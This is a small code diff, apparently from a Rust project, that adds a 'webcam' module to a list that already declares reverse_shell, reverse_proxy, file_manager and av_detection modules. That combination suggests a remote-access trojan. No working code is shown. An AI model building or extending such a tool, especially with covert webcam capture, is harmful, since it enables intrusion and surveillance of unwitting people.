@@ -8,3 +8,4 @@ pub mod reverse_shell;
 pub mod file_manager;
 pub mod reverse_proxy;
 pub mod av_detection;
+pub mod webcam;
